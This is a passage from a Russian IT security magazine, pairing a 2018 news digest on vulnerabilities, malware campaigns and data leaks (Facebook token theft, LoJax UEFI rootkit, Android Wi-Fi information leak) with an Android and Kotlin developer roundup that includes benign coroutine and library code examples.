  воохранительные органы в воп росах кибербезопас ности.


 22% РОССИЯН НЕ МОГУТ РАССТАТЬСЯ СО СМАРТФО ‐
 НОМ ДАЖЕ В ДУШЕ
  В России каждый третий владелец электронных устройств первым делом утром про веряет свой
   гаджет. Желание всегда быть на связи и оставаться в курсе событий при водит к тому, что люди
   чувствуют себя некомфор тно без смартфона под рукой. К таким выводам привело иссле дова‐
   ние «Лаборатории Касперского».

  45% пользователей не могут рас статься со смартфо ном во время еды, а 20% берут с собой
   гаджет, даже когда принимают душ.

  68% респондентов пом нят времена, когда у них не было возможнос ти всегда оставаться
   на связи, однако 74% из них не хотели бы возвращаться к этому.

   Более того, людям настолько нравится всегда быть в этом сос тоянии, что 23% даже носят
   с собой внешний аккумулятор на случай, если у девайса сядет батарея.





 НЕЗАКРЫТАЯ 0DAY
 В WINDOWS
  Эксперты Trend Micro Zero Day  Initiative (ZDI) обна родовали информацию
  о неисправленной уязвимос ти в сос таве СУБД Microsoft JET Database Engine.
  По данным иссле дователей, проб лема угрожает всем актуальным на сегодня
  версиям Windows (Windows 10, Windows 8.1, Windows 7, а также Windows Serv‐
   er от 2008 до 2016) и допускает исполне ние про извольного кода.
    Специалисты пишут, что уведомили инженеров Microsoft о проблеме еще в
  начале мая 2018 года и выждали даже не положенные в  таких  слу‐
   чаях 90 дней, а 120, учитывая серьезность бага. Однако патча для уязвимости
  по‐прежнему нет, хотя в рамках сентябрьского «вторника обновлений» раз‐
  работчики Microsoft устранили две дру гие проблемы в JET.
     Уязвимость представляет собой проб лему записи за пределы буфера
   (out‐of‐bounds writes), которая может возникнуть, если открыть источник дан‐
  ных JET через Object Linking and Embedding Database (OLEDB). Эксплуатация
  проблемы может привести к исполнению произвольного кода в контексте
  текущего пользователя. Одна ко, по сло вам исследователей, для этого ата‐
  кующему придется убедить свою жертву открыть специально созданный
  файл, содержащий данные СУБД JET. Этот формат используется самыми
  разными приложениями, и специалис ты предос терегают, что вре доносный
  код будет выполнен на уровне текущего процес са.
      Proof‐of‐concept экспло ит уже опуб ликован на GitHub.
    Официального патча можно ждать не раньше октябрьского «вторника
  обновлений». Однако об устра нении проб лемы позаботились сторонние спе‐
  циалисты — инженеры компании Acros Security. Патчи для свежей уязвимости
  были представлены в сос таве их продукта 0patch. 0patch — это платформа,
  предназначенная как раз для таких случаев, то есть исправления 0day и дру‐
   гих непропатченных уязвимостей, для поддержки продуктов, которые уже
  не поддерживаются производителями, кастомно го софта и так далее. Све жая
  версия 0patch содержит исправления для 32‐ и 64‐разрядных версий Win‐
  dows 10, 8.1, 7, а также Windows Server 2008–2016.


  ЧТО ЧАЩЕ ВСЕГО ЗАГРУЖАЮТ БОТ НЕТЫ
   Эксперты «Лаборатории Кас перского» проанализировали активность 60 тысяч ботнетов, свя‐
   занных со 150 семействами вредоносов. Как показало иссле дование, сре ди киберпреступни‐
   ков растет интерес к универсальным вредоносным прог раммам, которые мож но модифициро‐
   вать под практически неограниченное количество задач.


  В целом количество ска чанных их ботами уникальных вредонос ных файлов в первом полуго‐
   дии 2018 года (H1 2018) снизилось на 14,5% по сравнению со вторым полугодием 2017 года
   (H2 2017).





  В первой половине 2018 года доля бэкдоров вырос ла наиболее заметно по сравнению с дру‐
   гими категориями малвари. Так, если во второй половине 2017 года количество подобных инс‐
   трументов для удаленного доступа составляло 6,6% от общего чис ла циркулирующих в бот‐
   нетах вредоносов, то за первые шесть месяцев текущего года она уве личилась почти вдвое
   и составила 12,2%.

  В 2018 году самыми «разносторонними» ботами остались Hworm, Smoke и BetaBot (он же
   Neurevt). При этом ботнеты все чаще предоставляются в арен ду под «нужды» заказчика, и для
   многих ботнетов сложно выделить конкретную «специализацию».





   Наиболее распространенным бэкдором оказался njRAT. Он стал каждым 20-м фай лом, ска‐
   чиваемым ботами.


   Заметно выросли доли прог рамм‐загрузчиков и майнеров.  Так, про центный показатель
   для первых увеличился с 5% (во второй половине 2017 года) до 12%, а для вто рых — с 2,7%
   до 5%.

   Заметно снизились доли банковских троянов (с 22,5% до 13%) и спам‐ботов (с 18,9%
   до 7%). Хотя эксперты уверены, что говорить об уменьшении обще го количес тва банкеров
   преждевременно, поскольку довольно часто они дос тавляются на устройства прог рамма‐
   ми‐загрузчиками, доля которых, нап ротив, значительно вырос ла.





                                        Продолжение статьи →
← Начало статьи





 FACEBOOK СНОВА
 ДОПУСТИЛА УТЕЧКУ
 ДАННЫХ
  Казалось бы, после скандала, свя занного с компанией Cambridge Analytica
  и злоупотреблением поль зовательскими данными, Facebook стала намного
  серьезнее относиться к безопас ности пользователей. Однако в конце сен‐
  тября социальная сеть вновь сообщила о масштабной компрометации,
  по предварительным оценкам зат ронувшей более 50 миллионов пользовате‐
   лей.
     28 сентября 2018 года представители социальной сети сообщили, что
  неизвестные злоумышленники похища ли чужие токены доступа, используя
   уязвимость, связанную с функцией «Пос мотреть как» (View as). Данная фун‐
  кция позволяет увидеть свой профиль глазами другого пользовате ля.
    По официальным данным, баг появился в коде еще в июле 2017 года, но,
  судя по всему, преступники обнаружили его сравнительно недавно. Дело
   в том, что инже неры Facebook заметили первые странные скачки трафика
  и подозрительную активность (которая, как ока залось поз же, была связана
  с массовым хищением токенов) только в середи не сентября 2018 года, когда,
  очевидно, и началась активная эксплуатация проблемы.
     Полностью разоб рать ся в происходящем специалистам Facebook удалось
   только 26 сентября 2018 года, и уже на следующий день брешь, использован‐
  ную преступниками, закрыли. Никаких подробностей о самих злоумышленни‐
   ках пока не известно, так как рас следова ние инцидента еще далеко от завер‐
  шения и к делу лишь недавно подключились пра воохранительные органы.
   Также представители компании пока не закончили анализ данных пострадав‐
  ших пользовате лей и не смог ли сообщить, были ли атаки направле ны против
  пользователей конкретных регионов или стран. По предварительным данным,
   атаки не были целевыми.
    На экстренной пресс‐конференции вице‐президент компании Гай Розен
  (Guy Rosen) рассказал о некото рых техничес ких деталях случившегося. Так,
  он объяснил, что обнаруженная неизвестными хакерами уязвимость, по сути,
  представ ляла собой комбинацию трех отдельных багов.
    Проблема возникла после того, как разработчики создали новый заг‐
   рузчик видео летом 2017 года. Первый баг заключал ся в том, что при исполь‐
  зовании функции «Посмотреть как» загрузчик видео вообще не дол жен был
  отображаться, но в отдельных случаях (из‐за записей, при зывающих поль‐
  зователей пожелать счастливого дня рождения) он все же отображал ся.
     Второй баг заключался в том, что загрузчик некорректно использовал SSO
   (Single Sign‐On, технологию единого входа) и генерировал токены дос тупа,
  имеющие права в мобильном приложении Facebook.
     Третья ошибка проявлялась только в том слу чае, если перед этим уже
  были выполнены условия для возникновения первых двух проблем. После
   этого генерировался токен дос тупа, но не для «зрителя», использующего View
   as, а для пользователя, от лица которого «зритель» просматри вал профиль.
    Именно совокупность этих ошибок поз волила злоумышленни кам массово
  похищать токены пользователей (получив один токен, хакеры тут же перек‐
  лючались на друзей жертвы, затем на их друзей и так далее).
     Из‐за  случившегося  инженеры  Facebook решили  разлогинить  око‐
  ло 90 миллионов поль зователей социальной сети. Сообщается, что токены
  для 50 миллионов учетных записей были анну лированы из‐за злоупотребле‐
  ний злоумышленников, но в качес тве превентивной меры также были «отоз‐
  ваны» токены еще для 40 миллионов человек, которые пользовались функци‐
  ей «Посмотреть как» за последний год. Сама проб лемная функциональность
  было отключена на время проведения аудита безопасности.


 ЛИДЕР ПРОЕКТА OPENBSD РАСКРИТИКОВАЛ ИНЖЕНЕРОВ
  INTEL
   Тео де Раадт раскритиковал технологию одновремен ной мно гопо точности (Simultaneous Multi‐
    threading, SMT), hyper‐threading и инженеров Intel. Эксперт пишет, что пос ле недавнего обна‐
   ружения новых уязвимостей клас са Spectre, получивших название Foreshadow, раз работ чики
   приняли решение вовсе отка заться от использования SMT пос ле релиза OpenBSD 6.4.





  →«SMT фундаментально сломана, так как делит ресурсы между дву мя CPU‐инстансами и этим
   инстансам не хватает дифференциаторов безопас ности. Некоторые из таких атак по сторон‐
   нему каналу нетривиальны, но можно ожидать, что со временем большинство из них будут
   работать в самых обычных условиях (нап ример, пос редством JavaScript в браузе ре) и сливать
   данные ядра или данные меж ду виртуальными машинами. Будет раскрыто больше аппаратных
   багов и артефактов. С учетом того, как SMT взаимодействует со спе кулятивными вычис лени‐
   ями на процессорах Intel, я ожидаю, что SMT только усугубит большинство этих грядущих проб‐
   лем»,
  — Тео де Раадт





 УЯЗВИМОСТЬ,
 КОТОРУЮ
 НЕ ИСПРАВЯТ
  Специалисты Nightwatch Cybersecurity нашли опасную уязвимость в Android
    (CVE‐2018‐9489).
    Проблема связана с широковещательными сообщениями (Broadcast),
  а именно с механикой работы Intent — «намерений». Они используются
  для абстрактного описания операций и поз воляют приложениям и ОС тран‐
  слировать общесистемные сооб щения, которые  могут быть прочитаны
  любыми приложениями или компонентами самой ОС. По сути, «намере ния»
  используются для межпроцес сно го вза имодействия и чаще всего применя‐
  ются для вызова другой  Activity, например запуска браузера и перехода
  по заданному адресу.
    Иссле дователи обнаружили, что информа ция о Wi‐Fi‐сети и интерфейсе
  транслируется   сразу    дву мя     Intent:   WiﬁManager   NETWORK_S‐
  TATE_CHANGED_ACTION     и     WiﬁP2pManager     WIFI_P2P_THIS_DE‐
  VICE_CHANGED_ACTION. Используя эту особенность, любые приложения
  и их рекламные компоненты могут узнать имя Wi‐Fi‐сети, BSSID, локальный IP,
  информацию о DNS‐сервере и MAC‐адрес устройства. Причем перехватить
   эти данные возможно даже в том случае, если у при ложе ний нет разрешения
  на доступ к функциям Wi‐Fi. Фактичес ки ата ка позволяет обойти систему раз‐
  решений Android.
     Хотя на пер вый взгляд «утекающие» данные могут показаться не слишком
  важными, нужно понимать, что с помощью этой информации рекламные ком‐
  поненты приложений или малварь могут идентифицировать и отслеживать
  пользователя. К примеру, BSSID можно поискать в публично доступных базах
  WiGLE и SkyHook, таким образом узнав даже физическое местоположение
  жертвы. В этом случае атака, по сути, поз воляет обойти еще и разрешение
   Location Access.
    По данным Nightwatch Cybersecurity, перед проб лемой уязвимы все вер‐
  сии Android старше 6.0, включая крупные форки, вро де FireOS компании Ama‐
   zon. Исследователи проинформировали Google об уязвимости еще в марте
  текущего года, и инженеры компании исправили ее в Android Pie (9.0). Однако
   патчей для других версий ОС не ожидает ся.


  800 000 ПИСЕМ С ФАЙЛАМИ IQY РАЗОСЛАЛ NECURS
   Весной 2018 года операторы ботнета Necurs перешли на новый век тор атак, теперь к спамер‐
   ским письмам прикладыва ют файлы IQY (Internet Query), замаскирован ные под предложения
   скидок, маркетинговые акции и прочее. При открытии такие файлы поз воляют пользователю
   импортировать данные из внешних источников в таблицу Excel. Причем получен ная информа‐
   ция может быть и формулой Excel, которую программа выпол нит после получе ния.


   Специалисты IBM X‐Force подсчитали, что за период с кон ца мая до середины июля 2018 года
   ботнет Necurs провел 4 кампании и распространил более 780 000 писем, содержащих вре‐
   доносные файлы IQY.

   Таким способом Necurs в основном распространяет бэкдор FlawedAMMYY, пос тро енный
   на базе утекшего исходного кода Ammyy Admin, легитим ного инс тру мента для удален ного
   администрирования. Также ботнет заражает своих жертв заг рузчиками Marap и Quant
   Loader.





 РУТКИТ ДЛЯ UEFI
  Эксперты компании ESET расска зали о вредоносной кампании, в ходе
  которой был задействован первый извес тный руткит для Uniﬁed Extensible
   Firmware Interface (UEFI). Ранее подобное обсуждалось лишь с теоретической
   точки зре ния на ИБ‐кон ференциях.
    По данным аналитиков, руткит для UEFI использует группа российских пра‐
   вительственных хакеров, известная под названиями APT28, Sednit, Fancy
   Bear, Strontium, Sofacy и так далее. Зафиксирован как минимум один случай
  успешного внедрения вредоносного модуля во флеш‐память SPI, что гаран‐
   тирует злоумышленникам воз можность сохранить при сутствие в системе
  не только после переуста новки ОС, но и пос ле замены жесткого диска.
     Для внедрения руткита зло умышленники исполь зуют мал варь LoJax —
  «близнеца» легитимного решения LoJack компании Absolute Software, соз‐
  данного для защиты устройств от утери и кражи. Этот инструмент встраивает‐
  ся в UEFI и позволяет, к примеру, отслеживать мес тонахождение устрой ства
  или удаленно стереть данные.
    Появление вредоносных версий LoJack было обнаружено экспертами
  компании Arbor Networks еще весной текущего года. Тогда выяснилось, что
  преступники незначительно изменили инстру мент таким образом, чтобы он
  связывался с их управляющими серверами, а не с инфраструктурой Absolute
   Software. Иссле дователи называли LoJax «идеальным двойным агентом», так
   как он может удален но выполнить произвольный код в системе и практичес ки
  не отличается от легитимной версии инстру мента.
     Эксперты ESET обна ружили три типа вредоносов на скомпрометирован‐
  ном компьютере. Два из них отвечали за сбор данных об устройстве и его
  прошивке, тогда как третий занимался инъ екци ями вре доносных модулей
  и компрометировал прошивку, взаимо дей ствуя с SPI‐памятью. Для взаимо‐
  действия с UEFI/BIOS злоумышленники применя ли RWEverything и драйвер
  ядра RwDrv.sys, причем драйвер был подписан действительным сертифика‐
   том.
     Если же доступа на запись не было, прес тупники прибегали к помощи уяз‐
  вимости в UEFI четырехлетней давности (CVE‐2014‐8273), которая позволяет
  обойти запрет.





  Для защиты от LoJax в час тности и подоб ных угроз в целом исследователи
  рекомендуют исполь зовать механизм Secure Boot, проверяющий все ком‐
  поненты прошивки и их сертифика ты. Так как рут кит LoJax циф ровой подписи
  не имеет, подобная защита попросту не поз волит мал вари внедриться в сис‐
   тему. Также специалисты совету ют убедиться, что на материнской плате уста‐
  новлена самая свежая прошивка, ведь для успешной реализации подобной
   атаки требуется, чтобы защита SPI‐памяти была неверно настроена или уяз‐
  вима. Если эти усло вия не будут соб людены, реализовать атаку тоже
  не получится.


  BLUEBORNE ВСЕ ЕЩЕ ОПАСЕН

   Год назад, в сентябре 2017‐го, исследователи ком пании Armis предуп редили, что 5,3 мил лиар‐
   да устройств, работающих с различными имплемен тациями Bluetooth в Android, iOS, Windows
   и Linux, уязвимы перед восемью опасными проблемами, которым было присвоено общее наз‐
   вание BlueBorne. Теперь специалисты Armis опубликовали отчет о том, как ситуация изме‐
   нилась за прошедший год.


  Множество устройств, к сожалению, по‐прежнему уяз вимы перед BlueBorne, либо потому, что
   их не обновляют сами пользователи, либо потому, что производите ли просто не выпус кают
   для них патчей. К настоящему момен ту обновления получили лишь 2/3 уязвимых гаджетов.
   Это означает, что более 2 миллиардов устройств до сих пор работают без патчей.
   Собранная Armis статистика такова:

   768 000 000 устройств на базе Linux;

   734 000 000 устройств на базе Android 5.1 (Lollipop) и раньше;

   261 000 000 устройств на Android 6 (Marshmallow) и раньше;

  200 000 000 устройств под управлением Windows;

  50 000 000 iOS‐устрой ств, работающих с версиями 9.3.5 и ниже.
   Прогноз экспертов тоже выглядит неутешительно. По их мнению, BlueBorne‐уяз вимос ти будут
   представлять угрозу еще многие годы.





 ЗЛОЙ КУРСОР
  Исследователи Malwarebytes расска зали о мошеннической группе Partner‐
   stroka, которая блокирует пользователей Google Chrome на сайтах фаль‐
  шивой технической поддержки при помощи новой техники «злой курсор» (evil
   cursor).
    Сама идея перенаправить пользователя на вредонос ную или мошен‐
  ническую страницу и блокировать его там далеко не нова. Такие методы
  называют browlock и их применяют, например, чтобы заставить жертву
   остаться на странице и пос мотреть вредоносную видеорекламу, которая
  спровоцирует появление pop‐up’ов и «зависание» браузера, или чтобы
  не дать жертве покинуть страницу, на которой отображается фейковое пре‐
  дупреждение о заражении компьютера.
    В последнем случае поль зователя вынуждают свя заться с фальшивой тех‐
  нической поддержкой для «разрешения проблемы». Это может окончиться
   как установкой малвари, которая даст злоумышленникам доступ к системе
   (под видом антивируса), так и прос то оплатой неких услуг псевдосаппорта.
    Подобными мошенническими операци ями и занимается группа Partner‐
   stroka, за которой уже какое‐то время наблюда ют эксперты Malwarebytes.
     Текущая кампания зло умышленников посредс твом вредонос ной рекламы
  перенаправляет пользователей Google Chrome 69.0.3497.81 на специальные
  страницы. По данным специалистов, в общей сложности в этой опе рации
   участвуют более 16 тысяч вредонос ных доменов.
     Хотя в целом техники зло умышленников достаточно типичны для скама
   такого рода, использование методики  evil cursor отличает эту кампанию
   от остальных. Мошенники используют баг в Chromium, который провоцирует‐
  ся простым HTML‐кодом. В ито ге поль зователь кликает совсем не туда, куда
   установлен его курсор.





  Фактически этот Base64 blurb декодирует ся в курсор с низ ким разрешением,
  но злоумышленники также используют проз рачный пиксель размером 128 ×
   128, что превращает курсор в огромную область. В итоге пользователь кли‐
   кает совсем не туда, куда ему кажется, и не может покинуть мошенническую
  страницу.





  Специалисты Malwarebytes предупрежда ли,  что описанный баг еще не
  исправлен и уязвимостью уже начали пользовать ся другие преступные груп‐
   пы. Вскоре эта информа ция подтвердилась: эксперты Sucuri и Malwarebytes
  выявили массовую компромета цию сайтов, работа ющих под управлением
   WordPress. Тысячи взло манных ресурсов перенаправляют пользователей
  на сайты фальшивой техничес кой поддержки, а некоторые из них применяют
   технику «злой курсор». По данным исследова телей, вредоносная кампания
   активна с начала сентября 2018 года.
     Цель компро метации во всех случаях была одинаковой — переадресовать
  пользователя на вредоносный сайт, одна ко злоумышленни ки использовали
  разный подход ко взлому разных сайтов. Судя по всему, преступники эксплу‐
   атировали не уязвимости в самой CMS, но баги в различных плагинах и темах
  для WordPress.


 БОЛЕЕ 5000 МОШЕННИЧЕСКИХ ДОМЕНОВ «ПРОДАЮТ»
  IPHONE XS И IPHONE XS MAX
   Специалисты Group‐IB фиксируют резкий рост регис траций доменов сайтов с предложени ями
   новых смартфонов iPhone XS и iPhone XS Max. Мошенники не просто копируют сайт официаль‐
   ных дилеров техники Apple и регис трируют похожее домен ное имя, а используют те же каналы
   продвижения и инструменты привлечения покупателей, что и легальные магазины.

   За последние три месяца было обнаружено более 5000 подобных доменов. Часть из них уже
   используется мошенниками для фишин га, кражи информации о банковских картах и пер‐
   сональных данных пользователей.


   Количество созданных фишин говых ресур сов, ориентирован ных на пользовате лей продук тов
   компании Apple, выросло в 2 раза по сравнению с аналогичным периодом 2017 года и сос‐
   тавило более 800 ресурсов.

  В первый месяц после старта продаж потен циальная выручка только топ‐20 мошенничес ких
   ресурсов может составить около 500 000 долларов (33 мил лиона рублей).





 CSS ПЕРЕГРУЖАЕТ
 IPHONE
  В Сети был опубликован proof‐of‐concept экс пло ит для проблемы в движке
   WebKit, в частности используемом браузером Safari. После загрузки HTML‐
  страницы, содержащей специальный CSS‐код, iOS «падает» и перезагружа‐
   ется.
     Для эксплуатации проблемы используется CSS‐эффект backdrop‐ﬁlter,
  который применяется ко множеству DIV‐элементов на странице. Backdrop‐
   ﬁlter — сравнительно новое явление для CSS, данный эффект позволяет раз‐
  мыть или исказить цвета в зоне за каким‐либо элементом. Подоб ная опе‐
  рация требует немалых ресурсов, и это давно беспокоило некоторых раз‐
  работчиков.
    Обоснованность этих тревог в минувшие выходные доказал разработчик
  и ИБ‐специалист Сабри Аддуш (Sabri Haddouche), который и обнаружил
  проблему. Иссле дователь опуб ликовал в своем твиттере ссылку на PoC‐экс‐
  плоит, а также выложил видеодемонстрацию ата ки, приводящей к перезаг‐
   рузке смартфона. В зависимос ти от вер сии ОС атака приводит к прос той
  перезагрузке и перезапус ку UI или же про воцирует kernel panic и тоже при‐
  водит к ребуту.
    Иссле дователь также создал специальную стра ницу для демонстрации
  проблемы в действии.
    При этом Аддуш рас ска зывает, что баг затрагивает отнюдь не только iOS,
  он также может оказывать негативное влияние на macOS. По словам иссле‐
  дователя, в текущем виде (только HTML и CSS) атака «заморозит» Safari
  и замедлит macOS на добрую минуту и лишь после этого пользователь смо‐
  жет закрыть проб лемную вкладку.
    Более серьезная  атака на десктопную версию браузера  потребует
  модификации эксплоита и добавления JavaScript. Однако публиковать этот
   эксплоит исследователь не рискнул, так как проб лема сохраня ется даже пос‐
  ле перезагрузки устройства, Safari вновь подгружает вредоносную страницу,
  и цикл повторяется снова.
     Стоит заметить, что в конце месяца Аддуш, который продол жает искать
  DoS‐уязвимости в качес тве хоб би, обнаружил еще одну очень похожую проб‐
  лему в коде браузера Firefox. Баг работает для Mac, Linux и Windows, но не
  для Android. Затронуты все пос ледние версии, включая Firefox Developer
  и Nightly.
     Как и в случае WebKit, порой проблема влияет не только на сам браузер,
  но и на операционную систему в целом. В случае Mac и Linux экс плуатация
  бага приводит к «падению» процес са бра узера и появлению классичес кого
  сообщения о сбое в работе. В случае Windows все обстоит нес колько хуже.
  Эксплуатация ошибки приводит не только к проб лемам с самим браузе ром,
  она может и «подвесить» операционную систему в целом, и в итоге поль‐
  зователю придется делать «жесткую» перезагрузку.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Баг Mutagen Astronomy представляет угрозу для Red Hat Enterprise Linux, CentOS и Debian


  Обнаружены семь новых модулей для мал вари VPNFilter


   Ботнет Hide ‘N Seek научился атаковать устройства на Android


   Компания Mitsubishi отозвала более 68 тысяч автомобилей из‐за софтверных проблем


   Сервис Firefox Monitor поз воляет проверить свои данные на предмет уте чек


   Разработчики AdGuard инициировали сброс всех паролей из‐за credential stufﬁng атаки


   Следы применения шпионского ПО Pegasus найдены в 45 странах мира


   Злоумышленники массово перехватывают трафик тысяч роутеров MikroTik


   Перед новой вариацией атаки cold boot уязвимы почти все современные компьюте ры


   Власти США обвинили гражданина Северной Кореи в атаках WannaCry и взломе Sony Pictures
HEADER





        Евгений Зобнин
      Редактор Unixoid и Mobile
            zobnin@glc.ru


 ANDROID

    ИНСТРУМЕНТЫ ПРОГРАММИСТА
    И НОВЫЕ ВОЗМОЖНОСТИ KOTLIN





Этот месяц не был богат на события в мире инфосека,
о которых бы мы не написа ли в новостях. Поэтому сегод‐
няшний дайджест исключительно программерский. Итак,
в этом выпус ке: семь новых инструментов программиста
и дизайнера, советы по написа нию производительного при‐
ложения,  Observable‐поля  и  струк турированный  парал‐
лелизм в Kotlin, бенчмарки и, конечно же, подборка све жих
библиотек.


СТРУКТУРИРОВАННЫЙ ПАРАЛЛЕЛИЗМ В KOTLIN
Structured concurrency — статья Романа Елизарова из JetBrains о новой воз‐
можности библиотеки kotlinx.coroutines 0.26.0, а точнее даже не возможности,
а об изменении в подходе к написа нию рас параллеленного кода на Kotlin.
   Суть новой функции проста. Представим, что у нас есть такой код:


fun requestSomeData() {
    launch(UI) {
        updateUI(performRequest())
    }
}

Функция создает новую корутину в основном потоке при ложе ния (контекст
UI), а затем запускает бло кируемую (suspend) функцию performRequest,
которая делает какую‐то фоновую работу, не блокируя основной поток.
  Все хорошо, но у нас нет воз можности контролировать жизненный цикл
корутин. Что, если работа функции performRequest будет слишком дол гой
и пользователь, не дождавшись ответа, вернется на предыдущий экран при‐
ложения или запустит дру гой элемент интерфей са? Нам не нужны висящие
в фоне корутины.
   Как раз для этого и пригодится новая функция. Теперь корутины можно (и
нужно) ограничить своего рода «областью дей ствия». Например, если объ‐
явить активность, из которой вызывается функция requestSomeData, таким
образом:


class MyActivity : AppCompatActivity(), CoroutineScope {
    ...
}

И слегка изменить саму функцию, исключив из нее контекст (UI):


fun requestSomeData() {
    launch {
        updateUI(performRequest())
    }
}

Тогда запуск всех корутин будет происходить в одной области действия,
ограниченной активностью. Как только пользователь закроет активность, все
корутины будут завершены.
   Эту же возможность можно использовать для объединения зависящих
друг от друга опе раций. Например, следующий код позволяет выполнить
фоновую загрузку двух изображений одновременно, а затем объ еди нить их:


suspend fun loadAndCombine(name1: String, name2: String): Image {
    val deferred1 = async { loadImage(name1) }
    val deferred2 = async { loadImage(name2) }
    return combineImages(deferred1.await(), deferred2.await())
}

Хорошо и удобно, но есть проблемы. Что, если будет завершена корутина,
вызывавшая эту функцию? Мы получим две корутины‐бес призорника. А что,
если загрузка одного изображения закончится неудачей? Второе изоб‐
ражение продолжит загружаться, хотя нам это уже не нужно.
  Выход:


suspend fun loadAndCombine(name1: String, name2: String): Image =
    coroutineScope {
        val deferred1 = async { loadImage(name1) }
        val deferred2 = async { loadImage(name2) }
        combineImages(deferred1.await(), deferred2.await())
    }


БЕНЧМАРК ПОСЛЕДОВАТЕЛЬНОСТЕЙ KOTLIN
Benchmarking Kotlin Sequences — после обновления до Kotlin 1.2.70 каждый
программист должен был заметить, что среда разработки теперь предлагает
конвертировать кол лекции (те же списки, например) в последовательности
(sequence) перед их дальнейшей обра боткой (Call chain on collection should
be converted into Sequence). Но зачем это нужно и не приведет ли допол‐
нительная конвертация к оверхеду?
  Официальный текст анонса Kotlin 1.2.70 говорит нам о том, что такая кон‐
вертация позволит сущес твенно увеличить производительность комплексных
операций обработки данных.
  В теории это звучит логично, потому что пос ледовательности как раз
и были придуманы для ускорения операций обра ботки кол лекций. Они поз‐
воляют избавиться от оверхеда, вызванного тем, что такие операции, как ﬁlter
и map, примененные к спискам, фактически соз дают новые списки. Но одно
дело — теория, а другое — реальная жизнь.
   Возьмем два семпла кода обра бот ки списков. Классичес кий код:


list.filter { true }.map { it }.filter { true }.map { it }

И код, использующий конверта цию в пос ледова тельнос ти:


list.asSequence()
    .filter { true }.map { it }.filter { true }.map { it }
    .toList()

И протестируем их в раз ных ситуациях по отношению к разным спискам раз‐
ной длины.
  Результаты, как ни странно, почти одинаковы. Более того, последователь‐
ности дают совсем незначитель ный выигрыш в производительнос ти на корот‐
ких списках и существенно проигрывают спискам на очень длинных. Что
еще более интересно, если добавить в код небольшую задержку, симули‐
ровав реальные вычисления, раз ница про пада ет вовсе.
   Есть, однако, две ситуации, в которых последовательнос ти выигрывают
с очень большим отрывом: методы find и first. Происходит так потому, что
поиск в случае последовательностей оста навливается после того, как нужный
элемент найден, но продолжается в случае списков.





                        Результаты тес та


7 НОВЫХ ИНСТРУМЕНТОВ РАЗРАБОТЧИКА
Lucky 7 new tools and plugins for Android developers & designers — подборка
из семи свежих инструментов.
   1. adb-enhanced — скрипт‐обертка для ADB, существенно рас ширя‐
ющий его возможности. Позволяет, например, вклю чить Doze (режим энер‐
госбережения):


adbe doze on

Отключить передачу данных по мобильным сетям:


adbe mobile‐data off

и многое другое.
   2. deep-clean — скрипт, удаляющий все временные файлы, исполь‐
зованные при сборке приложения. Может пригодиться, если приложение
по какой‐то причине не собирается.
   3. Android-drawable-preview-plugin — плагин Android Studio, показы‐
вающий превью изоб ражений в папке Drawable.
   4. Android Input — плагин Android Studio, позволяющий быстро вводить
текст в эмулятор.
   5. bundletool — официальная утилита Google для работы с Android App
Bundle, новым форматом упаковки приложений Android Studio 3.2.
   6. GradientDrawableTuner — приложение для генерации и трансфор‐
мации Drawable.
   7. ColorBox — инструмент для подбора цветов.





                        Превью Drawable


КАК СОЗДАТЬ ВЫСОКОПРОИЗВОДИТЕЛЬНОЕ ПРИЛОЖЕНИЕ НА
KOTLIN
Writing an Android NES Emulator — Performance optimizations — небольшая
статья, автор которой рас ска зывает, как соз давал эмулятор NES на Kotlin
(ktnes) и какие уроки из это го вынес.
 1. Не стоит вызывать нативные функции (JNI) в основном цикле эмулятора.
   Из‐за необходимости маршалинга и демаршалинга данных JNI‐вызовы
   будут существенно замедлять код.
 2. Аллокации памяти дороги, поэто му их также сто ит избегать, а именно
   избавиться от создания объектов в основном цикле. Стоит иметь в виду,
   что объекты могут быть соз даны неявно, например при проходе по кол‐
   лекции в цикле; в этом случае будет создан объект клас са Iterator.
 3. Стоит подумать о сокращении стека вызовов, другими словами — раз‐
   вернуть последовательность вызовов функций в сплошной последова‐
   тельный код.


ТОП БИБЛИОТЕК ДЛЯ KOTLIN
What’s in your Larder: Libraries for Kotlin Android development — очередной топ
библиотек, в этот раз с акцентом на Kotlin‐раз работчиков.
   1. Kovenant — библиотека асинхрон ного программирования для Kotlin.
По сути, реализация паттерна Promise:


task {
    // some (long running) operation, or just:
    1 + 1
} then {
    i ‐> "result: $i"
} success {
    msg ‐> println(msg)
}

   2. Picasso — широко известная биб лиотека для загрузки, обработки
и показа изображений. Поз воляет сделать все эти действия с помощью
одной строки кода:


Picasso.get().load(url).resize(50, 50).centerCrop().into(imageView)

   3. Anko — библиотека, упрощающая раз работку приложений на языке
Kotlin. Кроме набора достаточно простых функций для показа сообщений
на экране, включает в себя DSL, позволяющий программировать интерфейс
прямо в коде:


verticalLayout {
    val name = editText()
    button("Say Hello") {
        onClick { toast("Hello, ${name.text}!") }
    }
}

   4. Fuel — сетевая библиотека, использующая лямбды для обработки
ответов, вместо традиционных для дру гих биб лиотек листенеров.
   5. Forge — простой в исполь зовании парсер JSON, разработанный авто‐
ром Fuel.
   6. Result — библиотека, поз воляющая вернуть из функции два значения
разных типов. Например, Result.Success может содержать значение, если
функция отработала пра вильно и вер нула зна чение, Result.Failure — в случае
ошибки.


OBSERVABLE-ПОЛЯ В KOTLIN
Hassle‐free listeners with Observable — статья о функции язы ка Koltin под наз‐
ванием Observable property, которая позволя ет выполнить код в момент
записи или чте ния значения поля.
  Ты сразу поймешь, зачем это нуж но, если программируешь для Android
не первый день: при изменении модели мы сра зу можем изменить View.
В коде это выглядит так:


class Book {
    var title: String by observable("untitled") { _, oldValue,
newValue ‐>
        // Твой код здесь
    }
}

При изменении названия книги выполняется твой код (очень жизненный при‐
мер, да).
   У Observable есть антагонист под названием Vetoable. В отличие от Ob‐
servable Vetoable выполняется не после, а до присвоения значения и может
заблокировать присвоение нового зна чения, если колбэк вернет false. При‐
мер:


class Book {
    var title: String by vetoable("untitled") { _, oldValue, newValue
 ‐>
        !newValue.isEmpty()
    }
}


БИБЛИОТЕКИ
 • Awesome‐Android‐Persistence — спи сок биб лиотек и фреймворков, пред‐
   назначенных для хранения данных на диске;
 • Cockpit — встраиваемый в приложение инстру мент, поз воляющий на лету
   изменять параметры интерфейса;
 • Tink — простая библиотека Google для реализации максимально коррек‐
   тного и безопасного шифрования;
 • PatternLockView — экран для вво да графичес кого ключа, аналогичный
   экрану блокировки Android;
 • WiseFy — враппер для более удобного управления модулем Wi‐Fi;
 • AndroidWM — библиотека для пометки изоб ражений с помощью водяных
   знаков;
 • CheckableChipView — переключатель в стиле приложения Google I/O 2018;
